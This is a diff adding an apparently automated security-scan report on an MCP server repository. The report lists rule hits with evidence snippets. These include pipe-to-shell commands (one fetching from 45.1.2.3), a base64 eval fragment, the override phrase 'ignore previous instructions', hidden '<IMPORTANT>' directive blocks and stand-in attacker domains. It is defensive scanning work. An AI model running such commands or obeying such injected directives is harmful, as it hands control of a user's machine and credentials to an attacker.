@@ -1,0 +1,173 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "davidi0x/aegis-jail-mcp",
+    "version": "3c694e923886b958fdfcb52951242b109833683d",
+    "download": "https://codeload.github.com/davidi0x/aegis-jail-mcp/tar.gz/3c694e923886b958fdfcb52951242b109833683d"
+  },
+  "archive_sha256": "4b207190af2637ebc633249e1328a152b7763dff6fce45dae3cfe9ace6779735",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/aegis_jail/scan.py",
+      "line": 12,
+      "evidence": "curl | sh",
+      "file_sha256": "41f3231811fd127335102ad78aa8aec5f358ad3cbb4b2786cf15c942a05670a3"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/aegis_jail/scan.py",
+      "line": 13,
+      "evidence": "eval(atob(",
+      "file_sha256": "41f3231811fd127335102ad78aa8aec5f358ad3cbb4b2786cf15c942a05670a3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/aegis_jail/scan.py",
+      "line": 8,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "41f3231811fd127335102ad78aa8aec5f358ad3cbb4b2786cf15c942a05670a3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/aegis_jail/trust.py",
+      "line": 6,
+      "evidence": "curl evil | sh",
+      "file_sha256": "861cb90c3cf99889090febf78fc030ddb0e25e158d0f5711238f69b4d9428cbd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/aegis_jail/textsafe.py",
+      "line": 10,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "86d4cad0b5c9b6296b12c0463f0f63a16e0bdd3fa7067cc06edb160c8fdf24bd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/README.md",
+      "line": 280,
+      "evidence": "curl | sh",
+      "file_sha256": "89b52ddb1aee0649b380274de088dd67c114f92f15e9aaa78d083a3e93f65ed4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/README.pl.md",
+      "line": 280,
+      "evidence": "curl | sh",
+      "file_sha256": "75f0afd39669d08479ab896d5299b4188605e144f75f1a55ed9e0c60a12e7cdf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/docs/THREAT_MODEL.md",
+      "line": 66,
+      "evidence": "curl … \\| sh",
+      "file_sha256": "e8bb800c34684044e6263df18aa95a80f7b9774a03e4e0c0af4d183668643c76"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/docs/images/scan.svg",
+      "line": 11,
+      "evidence": "curl -s http://45.1.2.3/x | sh",
+      "file_sha256": "01ef9021fb9aa03b996d5bf8ecd4807a30f084c88e5a56798d70a416ec4cc4ff"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/scripts/install.sh",
+      "line": 2,
+      "evidence": "curl -fsSL <raw-url>/scripts/install.sh | sh",
+      "file_sha256": "0e0557567bc6407a795295446dd4a06e8a75a8c71e9035f4cc8bd9a4a076f44e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/tests/test_hardening.py",
+      "line": 165,
+      "evidence": "curl x | sh",
+      "file_sha256": "b87115e9b353afc0f3ce9074bb8162778802421ffbdac589f257b0b5a2919535"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/tests/test_hardening.py",
+      "line": 32,
+      "evidence": "\\u{202e}",
+      "file_sha256": "b87115e9b353afc0f3ce9074bb8162778802421ffbdac589f257b0b5a2919535"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/tests/test_hardening.py",
+      "line": 38,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "b87115e9b353afc0f3ce9074bb8162778802421ffbdac589f257b0b5a2919535"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/tests/test_mcp.py",
+      "line": 75,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "649454e8b65a77f4a1963669a22a7579690deef1da4850c090eff8cd3ac4ea79"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "aegis-jail-mcp-3c694e923886b958fdfcb52951242b109833683d/tests/test_mcp.py",
+      "line": 73,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "649454e8b65a77f4a1963669a22a7579690deef1da4850c090eff8cd3ac4ea79"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "45.1.2.3",
+    "allowed.example",
+    "collector.evil.example",
+    "collector.example",
+    "dotenvx.com",
+    "evil.example",
+    "fsf.org",
+    "get.example.com",
+    "github.com",
+    "img.shields.io",
+    "index.docker.io",
+    "opencollective.com",
+    "patreon.com",
+    "registry.npmjs.org",
+    "tidelift.com",
+    "www.gnu.org",
+    "www.python.org",
+    "www.remotion.dev",
+    "www.w3.org",
+    "x.example"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
